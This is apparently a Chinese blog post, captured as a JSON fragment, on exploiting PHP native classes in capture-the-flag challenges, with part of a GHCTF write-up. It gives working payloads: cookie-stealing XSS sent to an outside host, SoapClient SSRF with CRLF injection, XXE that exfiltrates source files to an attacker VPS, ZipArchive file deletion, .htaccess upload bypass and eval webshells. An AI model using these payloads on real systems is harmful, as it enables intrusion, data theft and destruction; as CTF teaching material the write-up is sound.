Exception(\u0026#34;\u0026lt;script\u0026gt;window.open(\u0026#39;http://c58a1663-14ce-4f57-b10a-2d43f95f5747.node5.buuoj.cn:81/?\u0026#39;+document.cookie);\u0026lt;/script\u0026gt;\u0026#34;); echo urlencode(serialize($poc)); ?\u0026gt; 然后查看cookie就行了\n使用 Error/Exception 内置类绕过哈希比较 在上文中，我们已经认识了Error和Exception这两个PHP内置类，但对他们妙用不仅限于 XSS，还可以通过巧妙的构造绕过md5()函数和sha1()函数的比较。这里我们就要详细的说一下这个两个错误类了。\n我们可以看到，在Error和Exception这两个PHP原生类中内只有 __toString 方法，这个方法用于将异常或错误对象转换为字符串。\n我们以Error为例，我们看看当触发他的 __toString 方法时会发生什么：\n1 2 3 4 5 6 \u0026lt;?php $a = new Error(\u0026#34;payload\u0026#34;,1); echo $a; //输出如下：Error: payload in /usercode/file.php:2 Stack trace: #0 {main} 发现这将会以字符串的形式输出当前报错，包含当前的错误信息（\u0026ldquo;payload\u0026rdquo;）以及当前报错的行号（\u0026ldquo;2\u0026rdquo;），而传入 Error(\u0026quot;payload\u0026quot;,1) 中的错误代码“1”则没有输出出来。\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?php $a = new Error(\u0026#34;payload\u0026#34;,1);$b = new Error(\u0026#34;payload\u0026#34;,2); echo $a; echo \u0026#34;\\r\\n\\r\\n\u0026#34;; echo $b; //输出： Error: payload in /usercode/file.php:2 Stack trace: #0 {main} Error: payload in /usercode/file.php:2 Stack trace: #0 {main} 可见，$a 和 $b 这两个错误对象本身是不同的，但是 __toString 方法返回的结果是相同的。注意，这里之所以需要在同一行是因为 __toString 返回的数据包含当前行号。\nException 类与 Error 的使用和结果完全一样，只不过 Exception 类适用于PHP 5和7，而 Error 只适用于 PHP 7。\nError和Exception类的这一点在绕过在PHP类中的哈希比较时很有用，具体请看下面这道例题。\n例题：[2020 极客大挑战]Greatphp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;?php error_reporting(0); class SYCLOVER { public $syc; public $lover; public function __wakeup(){ if( ($this-\u0026gt;syc != $this-\u0026gt;lover) \u0026amp;\u0026amp; (md5($this-\u0026gt;syc) === md5($this-\u0026gt;lover)) \u0026amp;\u0026amp; (sha1($this-\u0026gt;syc)=== sha1($this-\u0026gt;lover)) ){ if(!preg_match(\u0026#34;/\\\u0026lt;\\?php|\\(|\\)|\\\u0026#34;|\\\u0026#39;/\u0026#34;, $this-\u0026gt;syc, $match)){ eval($this-\u0026gt;syc); } else { die(\u0026#34;Try Hard !!\u0026#34;); } } } } if (isset($_GET[\u0026#39;great\u0026#39;])){ unserialize($_GET[\u0026#39;great\u0026#39;]); } else { highlight_file(__FILE__); } ?\u0026gt; 可见，需要进入eval()执行代码需要先通过上面的if语句：\n1 if( ($this-\u0026gt;syc != $this-\u0026gt;lover) \u0026amp;\u0026amp; (md5($this-\u0026gt;syc) === md5($this-\u0026gt;lover)) \u0026amp;\u0026amp; (sha1($this-\u0026gt;syc)=== sha1($this-\u0026gt;lover)) ) 这个乍看一眼在ctf的基础题目中非常常见，一般情况下只需要使用数组即可绕过。但是这里是在类里面，我们当然不能这么做。\n这里的考点是md5()和sha1()可以对一个类进行hash，并且会触发这个类的 __toString 方法；且当eval()函数传入一个类对象时，也会触发这个类里的 __toString 方法\n根据刚才讲的Error类和Exception类中 __toString 方法的特性，我们可以用这两个内置类进行绕过。\n由于题目用preg_match过滤了小括号无法调用函数，所以我们尝试直接 include \u0026quot;/flag\u0026quot; 将flag包含进来即可。由于过滤了引号，我们直接用url取反绕过即可。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 \u0026lt;?php class SYCLOVER { public $syc; public $lover; public function __wakeup(){ if( ($this-\u0026gt;syc != $this-\u0026gt;lover) \u0026amp;\u0026amp; (md5($this-\u0026gt;syc) === md5($this-\u0026gt;lover)) \u0026amp;\u0026amp; (sha1($this-\u0026gt;syc)=== sha1($this-\u0026gt;lover)) ){ if(!preg_match(\u0026#34;/\\\u0026lt;\\?php|\\(|\\)|\\\u0026#34;|\\\u0026#39;/\u0026#34;, $this-\u0026gt;syc, $match)){ eval($this-\u0026gt;syc); } else { die(\u0026#34;Try Hard !!\u0026#34;); } } } } $str = \u0026#34;?\u0026gt;\u0026lt;?=include~\u0026#34;.urldecode(\u0026#34;%D0%99%93%9E%98\u0026#34;).\u0026#34;?\u0026gt;\u0026#34;; /* 或使用[~(取反)][!%FF]的形式， 即: $str = \u0026#34;?\u0026gt;\u0026lt;?=include[~\u0026#34;.urldecode(\u0026#34;%D0%99%93%9E%98\u0026#34;).\u0026#34;][!.urldecode(\u0026#34;%FF\u0026#34;).\u0026#34;]?\u0026gt;\u0026#34;; $str = \u0026#34;?\u0026gt;\u0026lt;?=include $_GET[_]?\u0026gt;\u0026#34;; */ $a=new Error($str,1);$b=new Error($str,2); $c = new SYCLOVER(); $c-\u0026gt;syc = $a; $c-\u0026gt;lover = $b; echo(urlencode(serialize($c))); ?\u0026gt; 这里 $str = \u0026quot;?\u0026gt;\u0026quot;; 中为什么要在前面加上一个 ?\u0026gt; 呢？因为 Exception 类与 Error 的 __toString 方法在eval()函数中输出的结果是不可能控的，即输出的报错信息中，payload前面还有一段杂乱信息“Error: ”：\n1 2 3 Error: payload in /usercode/file.php:2 Stack trace: #0 {main} 进入eval()函数会类似于：eval(\u0026quot;...Error: \u0026lt;?php payload ?\u0026gt;\u0026quot;)。所以我们要用 ?\u0026gt; 来闭合一下，即 eval(\u0026quot;...Error: ?\u0026gt;\u0026lt;?php payload ?\u0026gt;\u0026quot;)，这样我们的payload便能顺利执行了。\n使用 SoapClient 类进行 SSRF SoapClient 类 这个要在本地的php.ini里面把soap拓展启动\nPHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。\n可以看到，该内置类有一个 __call 方法，当 __call 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 __call 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。\n该类的构造函数如下：\n1 public SoapClient :: SoapClient(mixed $wsdl [，array $options ]) 第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。 第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。 使用 SoapClient 类进行 SSRF 知道上述两个参数的含义后，就很容易构造出SSRF的利用Payload了。我们可以设置第一个参数为null，然后第二个参数的location选项设置为target_url。\n1 2 3 4 5 6 7 \u0026lt;?php $a = new SoapClient(null,array(\u0026#39;location\u0026#39;=\u0026gt;\u0026#39;http://47.xxx.xxx.72:2333/aaa\u0026#39;, \u0026#39;uri\u0026#39;=\u0026gt;\u0026#39;http://47.xxx.xxx.72:2333\u0026#39;)); $b = serialize($a); echo $b; $c = unserialize($b); $c-\u0026gt;a(); // 随便调用对象中不存在的方法, 触发__call方法进行ssrf ?\u0026gt; 但是，由于它仅限于HTTP/HTTPS协议，所以用处不是很大。而如果这里HTTP头部还存在CRLF漏洞的话，但我们则可以通过SSRF+CRLF，插入任意的HTTP头。如下测试代码，我们在HTTP头中插入一个cookie：\n1 2 3 4 5 6 7 8 \u0026lt;?php $target = \u0026#39;http://47.xxx.xxx.72:2333/\u0026#39;; $a = new SoapClient(null,array(\u0026#39;location\u0026#39; =\u0026gt; $target, \u0026#39;user_agent\u0026#39; =\u0026gt; \u0026#34;WHOAMI\\r\\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\u0026#34;, \u0026#39;uri\u0026#39; =\u0026gt; \u0026#39;test\u0026#39;)); $b = serialize($a); echo $b; $c = unserialize($b); $c-\u0026gt;a(); // 随便调用对象中不存在的方法, 触发__call方法进行ssrf ?\u0026gt; 例题：bestphp\u0026rsquo;s revenge 1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?php highlight_file(__FILE__); $b = \u0026#39;implode\u0026#39;; call_user_func($_GET[\u0026#39;f\u0026#39;], $_POST); session_start(); if (isset($_GET[\u0026#39;name\u0026#39;])) { $_SESSION[\u0026#39;name\u0026#39;] = $_GET[\u0026#39;name\u0026#39;]; } var_dump($_SESSION); $a = array(reset($_SESSION), \u0026#39;welcome_to_the_lctf2018\u0026#39;); call_user_func($b, $a); ?\u0026gt; 目录扫描有flag.php\n1 2 3 4 5 6 7 only localhost can get flag!session_start(); echo \u0026#39;only localhost can get flag!\u0026#39;; $flag = \u0026#39;LCTF{*************************}\u0026#39;; if($_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;]===\u0026#34;127.0.0.1\u0026#34;){ $_SESSION[\u0026#39;flag\u0026#39;] = $flag; } only localhost can get flag! 可见当REMOTE_ADDR等于127.0.0.1时，就会在session中插入flag，就能得到flag。很明显了，要利用ssrf。\n但是这里并没有明显的ssrf利用点，所以我们想到利用PHP原生类SoapClient触发反序列化导致SSRF。并且，由于flag会被插入到session中，所以我们就一定需要携带一个cookie即PHPSESSID去访问它来生成这个session文件。\n1 2 3 4 5 6 7 \u0026lt;?php $target = \u0026#34;http://127.0.0.1/flag.php\u0026#34;; $attack = new SoapClient(null,array(\u0026#39;location\u0026#39; =\u0026gt; $target, \u0026#39;user_agent\u0026#39; =\u0026gt; \u0026#34;N0rth3ty\\r\\nCookie: PHPSESSID=klr898lmagsa80co3ghnhkt932\\r\\n\u0026#34;, \u0026#39;uri\u0026#39; =\u0026gt; \u0026#34;123\u0026#34;)); $payload = urlencode(serialize($attack)); echo $payload; 这里这个POC就是利用CRLF伪造本地请求SSRF去访问flag.php，并将得到的flag结果保存在cookie为 PHPSESSID=klr898lmagsa80co3ghnhkt932 的session中。\n然后，我们就要想办法反序列化这个对象，但这里有没有反序列化点，那么我们怎么办呢？我们在题目源码中发现了session_start();，很明显，我们可以用session反序列化漏洞。但是如果想要利用session反序列化漏洞的话，我们必须要有 ini_set() 这个函数来更改 session.serialize_handler 的值，将session反序列化引擎修改为其他的引擎，本来应该使用ini_set()这个函数的，但是这个函数不接受数组，所以就不行了。于是我们就用session_start()函数来代替，即构造 session_start(serialize_handler=php_serialize) 就行了。我们可以利用题目中的 call_user_func($_GET['f'], $_POST); 函数，传入GET：/?f=session_start、POST：serialize_handler=php_serialize，实现 session_start(serialize_handler=php_serialize) 的调用来修改此页面的序列化引擎为php_serialize。\n这里还利用到session反序列化的一个点\n当存储是php_serialize处理，然后调用时php去处理，如果这时注入的数据时a=|O:4:“test”:0:{}，那么session中的内容是a:1:{s:1:“a”;s:16:\u0026quot;|O:4:“test”:0:{}\u0026quot;;}，那么a:1:{s:1:“a”;s:16:\u0026quot;会被php解析成键名，后面就是一个test对象的注入。 通过这个我们就能实现session_start([‘serialize_handler’=\u0026gt;‘php_serialize’])达到注入的效果。\n1 2 3 4 GET: ?f=session_start\u0026amp;name=|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A56%3A%22N0rth3ty%0D%0ACookie%3A+PHPSESSID%3Dklr898lmagsa80co3ghnhkt932%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D POST: serialize_handler=php_serialize 此时，我们成功将我们php原生类SoapClient构造的payload传入了 PHPSESSID=klr898lmagsa80co3ghnhkt932 的session中，当页面重新加载时，就会自动将其反序列化。\n但此时还不会触发SSRF，需要触发 __call 方法来造成SSRF，该方法在访问对象中一个不存在的方法时会被自动调用，所以单纯反序列化还不行，我们还需要访问该对象中一个不存在的方法，这里就用到了如下这段代码：\n1 2 $a = array(reset($_SESSION), \u0026#39;welcome_to_the_lctf2018\u0026#39;); call_user_func($b, $a); 我们可以利用extract函数将变量b覆盖为call_user_func，这样，就成了：\n1 call_user_func(call_user_func, array(reset($_SESSION), \u0026#39;welcome_to_the_lctf2018\u0026#39;)); call_user_func()函数有一个特性，就是当只传入一个数组时，可以用call_user_func()来调用一个类里面的方法，call_user_func()会将这个数组中的第一个值当做类名，第二个值当做方法名。\n我们覆盖完后变成call_user_func(SoapClient-\u0026gt;welcome_to_the_lctf2018)\n这样也就是会访问我们构造的session对象中的welcome_to_the_lctf2018方法，而welcome_to_the_lctf2018方法不存在，就会触发 __call 方法，造成ssrf去访问flag.php。\n1 2 3 4 GET: ?f=extract\u0026amp;name=SoapClient POST: b=call_user_func 然后再用前面的phpsesseionid来访问就会回显flag\n使用 DirectoryIterator 类绕过 open_basedir DirectoryIterator类 DirectoryIterator与glob://协议结合将无视open_basedir对目录的限制，可以用来列举出指定目录下的文件。\n1 2 3 4 5 6 7 8 9 10 11 // test.php \u0026lt;?php $dir = $_GET[\u0026#39;whoami\u0026#39;]; $a = new DirectoryIterator($dir); foreach($a as $f){ echo($f-\u0026gt;__toString().\u0026#39;\u0026lt;br\u0026gt;\u0026#39;); } ?\u0026gt; # payload一句话的形式: $a = new DirectoryIterator(\u0026#34;glob:///*\u0026#34;);foreach($a as $f){echo($f-\u0026gt;__toString().\u0026#39;\u0026lt;br\u0026gt;\u0026#39;);} 传参\n1 ?whoami=glob:///* 就能读根目录下文件\nFilesystemIterator类 FilesystemIterator类继承于DirectoryIterator类,所以两者作用和用法基本相同，区别在于FilesystemIterator会显示文件的完整路径，而DirectoryIterator只显示文件名\nGlobIterator类 由官方说明我们可以得知这个原生类是自带glob的，GlobIterator类的特点只需要知道部分名称可以进行遍历，内置的魔术方法是__toString。这个就不需要打glob或者file伪协议了\nSplFileInfo 类 SplFileInfo 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作，SplFileInfo::__toString将文件路径作为字符串返回，这个可以实现文件读取\n使用 SimpleXMLElement 类进行 XXE SimpleXMLElement 这个内置类用于解析 XML 文档中的元素。\n第三个参数data_is_url要打开。设置为true，第一个参数 data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。第二个参数设置为2\n这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。\n例题：[SUCTF 2018]Homework 进入题目先注册登入一个账号，有一个计算器\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 \u0026lt;?php class calc{ function __construct__(){ calc(); } function calc($args1,$method,$args2){ $args1=intval($args1); $args2=intval($args2); switch ($method) { case \u0026#39;a\u0026#39;: $method=\u0026#34;+\u0026#34;; break; case \u0026#39;b\u0026#39;: $method=\u0026#34;-\u0026#34;; break; case \u0026#39;c\u0026#39;: $method=\u0026#34;*\u0026#34;; break; case \u0026#39;d\u0026#39;: $method=\u0026#34;/\u0026#34;; break; default: die(\u0026#34;invalid input\u0026#34;); } $Expression=$args1.$method.$args2; eval(\u0026#34;\\$r=$Expression;\u0026#34;); die(\u0026#34;Calculation results:\u0026#34;.$r); } } ?\u0026gt;\t点击计算可以看传参,计算2+2的结果\n1 /show.php?module=calc\u0026amp;args[]=2\u0026amp;args[]=a\u0026amp;args[]=2 所以我们可以通过这种形式调用PHP中的内置类。这里我们通过调用 SimpleXMLElement 这个内置类来构造 XXE。\n首先，我们在vps上构造如下evil.xml、send.xml和send.php这三个文件。\nevil.xml：\n1 2 3 4 5 6 7 \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE ANY[ \u0026lt;!ENTITY % remote SYSTEM \u0026#34;http://47.122.53.248/send.xml\u0026#34;\u0026gt; %remote; %all; %send; ]\u0026gt; send.xml：\n1 2 \u0026lt;!ENTITY % file SYSTEM \u0026#34;php://filter/read=convert.base64-encode/resource=index.php\u0026#34;\u0026gt; \u0026lt;!ENTITY % all \u0026#34;\u0026lt;!ENTITY \u0026amp;#x25; send SYSTEM \u0026#39;http://47.122.53.248/send.php?file=%file;\u0026#39;\u0026gt;\u0026#34;\u0026gt; send.php：\n1 2 3 \u0026lt;?php file_put_contents(\u0026#34;result.txt\u0026#34;, $_GET[\u0026#39;file\u0026#39;]) ; ?\u0026gt; 然后在url中构造如下：\n1 /show.php?module=SimpleXMLElement\u0026amp;args[]=http://47.122.53.248/evil.xml\u0026amp;args[]=2\u0026amp;args[]=true 这样目标主机就能先加载我们vps上的evil.xml，再加载send.xml。\n使用 ZipArchive 类来删除文件 如果设置flags参数的值为 ZipArchive::OVERWRITE 的话，可以把指定文件删除。这里我们跟进方法可以看到const OVERWRITE = 8，也就是将OVERWRITE定义为了常量8，我们在调用时也可以直接将flags赋值为8。也就是说我们可以利用ZipArchive原生类调用open方法删除目标主机上的文件。\n例题：NepCTF2021 梦里花开牡丹亭 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 \u0026lt;?php highlight_file(__FILE__); error_reporting(0); include(\u0026#39;shell.php\u0026#39;); class Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content; public function __construct() { $this-\u0026gt;username=\u0026#39;user\u0026#39;; $this-\u0026gt;password=\u0026#39;user\u0026#39;; } public function __wakeup(){ if(md5($this-\u0026gt;register)===\u0026#34;21232f297a57a5a743894a0e4a801fc3\u0026#34;){ // admin $this-\u0026gt;choice=new login($this-\u0026gt;file,$this-\u0026gt;filename,$this-\u0026gt;content); }else{ $this-\u0026gt;choice = new register(); } } public function __destruct() { $this-\u0026gt;choice-\u0026gt;checking($this-\u0026gt;username,$this-\u0026gt;password); } } class login{ public $file; public $filename; public $content; public function __construct($file,$filename,$content) { $this-\u0026gt;file=$file; $this-\u0026gt;filename=$filename; $this-\u0026gt;content=$content; } public function checking($username,$password) { if($username===\u0026#39;admin\u0026#39;\u0026amp;\u0026amp;$password===\u0026#39;admin\u0026#39;){ $this-\u0026gt;file-\u0026gt;open($this-\u0026gt;filename,$this-\u0026gt;content); die(\u0026#39;login success you can to open shell file!\u0026#39;); } } } class register{ public function checking($username,$password) { if($username===\u0026#39;admin\u0026#39;\u0026amp;\u0026amp;$password===\u0026#39;admin\u0026#39;){ die(\u0026#39;success register admin\u0026#39;); }else{ die(\u0026#39;please register admin \u0026#39;); } } } class Open{ function open($filename, $content){ if(!file_get_contents(\u0026#39;waf.txt\u0026#39;)){ // 当waf.txt没读取成功时才能得到flag shell($content); }else{ echo file_get_contents($filename.\u0026#34;.php\u0026#34;); // filename=php://filter/read=convert.base64-encode/resource=shell } } } if($_GET[\u0026#39;a\u0026#39;]!==$_GET[\u0026#39;b\u0026#39;]\u0026amp;\u0026amp;(md5($_GET[\u0026#39;a\u0026#39;]) === md5($_GET[\u0026#39;b\u0026#39;])) \u0026amp;\u0026amp; (sha1($_GET[\u0026#39;a\u0026#39;])=== sha1($_GET[\u0026#39;b\u0026#39;]))){ @unserialize(base64_decode($_POST[\u0026#39;unser\u0026#39;])); } 开头包含了shell.php，我们可以构造反序列化POC来读取shell.php：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 \u0026lt;?php class Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content; public function __construct() { $this-\u0026gt;username=\u0026#39;user\u0026#39;; $this-\u0026gt;password=\u0026#39;user\u0026#39;; } public function __wakeup(){ if(md5($this-\u0026gt;register)===\u0026#34;21232f297a57a5a743894a0e4a801fc3\u0026#34;){ // admin $this-\u0026gt;choice=new login($this-\u0026gt;file,$this-\u0026gt;filename,$this-\u0026gt;content); }else{ $this-\u0026gt;choice = new register(); } } public function __destruct() { $this-\u0026gt;choice-\u0026gt;checking($this-\u0026gt;username,$this-\u0026gt;password); } } class login{ public $file; public $filename; public $content; } class Open{ function open($filename, $content){ } } $poc = new Game(); $poc-\u0026gt;username = \u0026#34;admin\u0026#34;; $poc-\u0026gt;password = \u0026#34;admin\u0026#34;; $poc-\u0026gt;register = \u0026#34;admin\u0026#34;; $poc-\u0026gt;file = new Open(); $poc-\u0026gt;filename = \u0026#34;php://filter/read=convert.base64-encode/resource=shell\u0026#34;; $poc-\u0026gt;content = \u0026#34;xxx\u0026#34;; echo base64_encode(serialize($poc)); 执行POC生成的payload读取到shell.php的源码base64编码\n解码得到shell.php源码\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?php function shell($cmd){ if(strlen($cmd)\u0026lt;10){ if(preg_match(\u0026#39;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\\*|\\?/\u0026#39;,$cmd)){ die(\u0026#34;NO\u0026#34;); }else{ return system($cmd); } }else{ die(\u0026#39;so long!\u0026#39;); } } 联合index.php里面的Open类：\n1 2 3 4 5 6 7 8 9 class Open{ function open($filename, $content){ if(!file_get_contents(\u0026#39;waf.txt\u0026#39;)){ // 当waf.txt没读取成功时才能得到flag shell($content); }else{ echo file_get_contents($filename.\u0026#34;.php\u0026#34;); // filename=php://filter/read=convert.base64-encode/resource=shell } } } 所以我们应该要想办法将waf.txt这个文件删除，这样就会读取失败，才能执行我们的命令。\n所以我们利用ZipArchive原生类调用open方法，即可将即可将$filename（waf.txt）删除\nPOC\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 \u0026lt;?php class Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content; public function __construct() { $this-\u0026gt;username=\u0026#39;user\u0026#39;; $this-\u0026gt;password=\u0026#39;user\u0026#39;; } public function __wakeup(){ if(md5($this-\u0026gt;register)===\u0026#34;21232f297a57a5a743894a0e4a801fc3\u0026#34;){ // admin $this-\u0026gt;choice=new login($this-\u0026gt;file,$this-\u0026gt;filename,$this-\u0026gt;content); }else{ $this-\u0026gt;choice = new register(); } } public function __destruct() { $this-\u0026gt;choice-\u0026gt;checking($this-\u0026gt;username,$this-\u0026gt;password); } } class login{ public $file; public $filename; public $content; } class Open{ function open($filename, $content){ } } $poc = new Game(); $poc-\u0026gt;username = \u0026#34;admin\u0026#34;; $poc-\u0026gt;password = \u0026#34;admin\u0026#34;; $poc-\u0026gt;register = \u0026#34;admin\u0026#34;; $poc-\u0026gt;file = new ZipArchive(); $poc-\u0026gt;filename = \u0026#34;waf.txt\u0026#34;; $poc-\u0026gt;content = ZipArchive::OVERWRITE; echo base64_encode(serialize($poc)); 接下来就可以使用 n\\l /fla* 执行命令读取flag了\n","date":"2025-03-15T00:00:00Z","image":"https://0d000721999.github.io/p/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/1.png","permalink":"https://0d000721999.github.io/p/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/","title":"PHP原生类利用"},{"content":"GHCTF复现 UPUPUP apache 的服务器, 很容易想到 .htaccess；但是后端检测\n了mine类型, 如果直接在 .htaccess 开头加⼊ GIF89A 的话访问整个 images ⽬录下的⽂件都会爆\n500, 会出现语法错误。.htaccess 通过 # 来注释, 后来了解到还有 \\x00\n1 2 #define width 1 #define height 1 用之前的这个没用，还得抓包用repeater传\n1 2 3 \u0026lt;FilesMatch \u0026#34;hey.hey\u0026#34;\u0026gt; SetHandler application/x-httpd-php \u0026lt;/FilesMatch\u0026gt; 然后传一个hey.hey\n1 \u0026lt;?php @eval($_POST[1]);?\u0026gt; 蚁剑连hey.hey\nGetShell 代码审计\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 \u0026lt;?php highlight_file(__FILE__); class ConfigLoader { private $config; public function __construct() { $this-\u0026gt;config = [ \u0026#39;debug\u0026#39; =\u0026gt; true, \u0026#39;mode\u0026#39; =\u0026gt; \u0026#39;production\u0026#39;, \u0026#39;log_level\u0026#39; =\u0026gt; \u0026#39;info\u0026#39;, \u0026#39;max_input_length\u0026#39; =\u0026gt; 100, \u0026#39;min_password_length\u0026#39; =\u0026gt; 8, \u0026#39;allowed_actions\u0026#39; =\u0026gt; [\u0026#39;run\u0026#39;, \u0026#39;debug\u0026#39;, \u0026#39;generate\u0026#39;] ]; } public function get($key) { return $this-\u0026gt;config[$key] ?? null; } } class Logger { private $logLevel; public function __construct($logLevel) { $this-\u0026gt;logLevel = $logLevel; } public function log($message, $level = \u0026#39;info\u0026#39;) { if ($level === $this-\u0026gt;logLevel) { echo \u0026#34;[LOG] $message\\n\u0026#34;; } } } class UserManager { private $users = []; private $logger; public function __construct($logger) { $this-\u0026gt;logger = $logger; } public function addUser($username, $password) { if (strlen($username) \u0026lt; 5) { return \u0026#34;Username must be at least 5 characters\u0026#34;; } if (strlen($password) \u0026lt; 8) { return \u0026#34;Password must be at least 8 characters\u0026#34;; } $this-\u0026gt;users[$username] = password_hash($password, PASSWORD_BCRYPT); $this-\u0026gt;logger-\u0026gt;log(\u0026#34;User $username added\u0026#34;); return \u0026#34;User $username added\u0026#34;; } public function authenticate($username, $password) { if (isset($this-\u0026gt;users[$username]) \u0026amp;\u0026amp; password_verify($password, $this-\u0026gt;users[$username])) { $this-\u0026gt;logger-\u0026gt;log(\u0026#34;User $username authenticated\u0026#34;); return \u0026#34;User $username authenticated\u0026#34;; } return \u0026#34;Authentication failed\u0026#34;; } } class StringUtils { public static function sanitize($input) { return htmlspecialchars($input, ENT_QUOTES, \u0026#39;UTF-8\u0026#39;); } public static function generateRandomString($length = 10) { return substr(str_shuffle(str_repeat($x = \u0026#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39;, ceil($length / strlen($x)))), 1, $length); } } class InputValidator { private $maxLength; public function __construct($maxLength) { $this-\u0026gt;maxLength = $maxLength; } public function validate($input) { if (strlen($input) \u0026gt; $this-\u0026gt;maxLength) { return \u0026#34;Input exceeds maximum length of {$this-\u0026gt;maxLength} characters\u0026#34;; } return true; } } class CommandExecutor { private $logger; public function __construct($logger) { $this-\u0026gt;logger = $logger; } public function execute($input) { if (strpos($input, \u0026#39; \u0026#39;) !== false) { $this-\u0026gt;logger-\u0026gt;log(\u0026#34;Invalid input: space detected\u0026#34;); die(\u0026#39;No spaces allowed\u0026#39;); } @exec($input, $output); $this-\u0026gt;logger-\u0026gt;log(\u0026#34;Result: $input\u0026#34;); return implode(\u0026#34;\\n\u0026#34;, $output); } } class ActionHandler { private $config; private $logger; private $executor; public function __construct($config, $logger) { $this-\u0026gt;config = $config; $this-\u0026gt;logger = $logger; $this-\u0026gt;executor = new CommandExecutor($logger); } public function handle($action, $input) { if (!in_array($action, $this-\u0026gt;config-\u0026gt;get(\u0026#39;allowed_actions\u0026#39;))) { return \u0026#34;Invalid action\u0026#34;; } if ($action === \u0026#39;run\u0026#39;) { $validator = new InputValidator($this-\u0026gt;config-\u0026gt;get(\u0026#39;max_input_length\u0026#39;)); $validationResult = $validator-\u0026gt;validate($input); if ($validationResult !== true) { return $validationResult; } return $this-\u0026gt;executor-\u0026gt;execute($input); } elseif ($action === \u0026#39;debug\u0026#39;) { return \u0026#34;Debug mode enabled\u0026#34;; } elseif ($action === \u0026#39;generate\u0026#39;) { return \u0026#34;Random string: \u0026#34; . StringUtils::generateRandomString(15); } return \u0026#34;Unknown action\u0026#34;; } } if (isset($_REQUEST[\u0026#39;action\u0026#39;])) { $config = new ConfigLoader(); $logger = new Logger($config-\u0026gt;get(\u0026#39;log_level\u0026#39;)); $actionHandler = new ActionHandler($config, $logger); $input = $_REQUEST[\u0026#39;input\u0026#39;] ?? \u0026#39;\u0026#39;; echo $actionHandler-\u0026gt;handle($_REQUEST[\u0026#39;action\u0026#39;], $input); } else { $config = new ConfigLoader(); $logger = new Logger($config-\u0026gt;get(\u0026#39;log_level\u0026#39;)); $userManager = new UserManager($logger); if (isset($_POST[\u0026#39;register\u0026#39;])) { $username = $_POST[\u0026#39;username\u0026#39;]; $password = $_POST[\u0026#39;password\u0026#39;]; echo $userManager-\u0026gt;addUser($username, $password); } if (isset($_POST[\u0026#39;login\u0026#39;])) { $username = $_POST[\u0026#39;username\u0026#39;]; $password = $_POST[\u0026#39;password\u0026#39;]; echo $userManager-\u0026gt;authenticate($username, $password); } $logger-\u0026gt;log(\u0026#34;No action provided, running default logic\u0026#34;); } 这里有个命令执行的类\n下面这个handle函数要让action强等于run,input可以写个马\n1 2 3 ?action=run\u0026amp;input=echo PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=|base64 -d\u0026gt;shell.php 因为前面有检测空格，用%09绕过 